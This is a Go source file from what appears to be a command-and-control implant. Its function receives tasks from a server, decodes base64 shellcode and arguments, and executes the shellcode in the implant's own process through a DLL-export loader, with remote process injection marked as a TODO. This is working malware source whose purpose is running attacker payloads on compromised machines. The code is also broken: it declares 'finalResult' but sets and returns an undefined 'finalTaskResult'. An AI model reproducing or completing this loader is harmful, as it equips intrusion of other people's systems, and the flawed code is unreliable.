package agent

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/command/shellcode"
	"numinon_shadow/internal/models"
	"strings"
)

// orchestrateShellcode is the orchestrator for the SHELLCODE command.
func (a *Agent) orchestrateShellcode(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.ShellcodeArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal ShellcodeArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|✅ SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Target PID: %d, Export Function: %s, ShellcodeLen(b64)=%d\n",
		task.TaskID, args.TargetPID, args.ExportName, len(args.ShellcodeBase64))

	// Some basic agent-side validation
	if args.ShellcodeBase64 == "" {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", task.TaskID)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureInvalidArgs,
			Error:  "ShellcodeBase64 cannot be empty.",
		}
	}
	if args.ExportName == "" {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ExportName is empty.", task.TaskID)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureInvalidArgs,
			Error:  "ExportName must be specified for DLL execution.",
		}
	}

	// Now let's decode our b64
	rawShellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeBase64)
	if err != nil {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ShellcodeBase64: %v", task.TaskID, err)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureDecodeError,
			Error:  fmt.Sprintf("Failed to decode shellcode: %v", err),
		}
	}

	// Write decoded contents to a byte slice for use
	var decodedShellcodeArgs []byte
	if args.ArgumentsForShellcodeBase64 != "" {
		decodedShellcodeArgs, err = base64.StdEncoding.DecodeString(args.ArgumentsForShellcodeBase64)
		if err != nil {
			log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ArgumentsForShellcodeBase64: %v", task.TaskID, err)
			return models.AgentTaskResult{
				TaskID: task.TaskID,
				Status: models.StatusFailureDecodeError,
				Error:  fmt.Sprintf("Failed to decode shellcode arguments: %v", err),
			}
		}
	}

	// For now we only support auto-injection (PID)
	// TODO add logic to allow for external process injection

	if args.TargetPID != 0 {
		log.Printf("|WARN EXEC_SHELLCODE HANDLER| Task ID %s: Remote process injection (PID %d) not yet supported. Attempting self-injection.", task.TaskID, args.TargetPID)

		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureNotSupported,
			Error:  "Remote PID injection not yet implemented.",
		}
	}

	// Call the "doer" function
	commandShellcode := shellcode.New()

	// Note that we are hardcoding 0 (self-injection) here TODO change this when ext process injection is added
	shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, 0, decodedShellcodeArgs, args.ExportName) // Call the interface method

	finalResult := models.AgentTaskResult{
		TaskID: task.TaskID,
		// Output will be set below after JSON encoding
	}

	outputJSON, _ := json.Marshal(string(shellcodeResult.Message))

	finalResult.Output = outputJSON

	if err != nil {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
			task.TaskID, err, shellcodeResult.Message)
		finalTaskResult.Status = models.StatusFailureLoaderError
		finalTaskResult.Error = err.Error()

	} else {
		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
			task.TaskID, shellcodeResult.Message)
		finalTaskResult.Status = models.StatusSuccessLaunched
	}

	return finalTaskResult

}
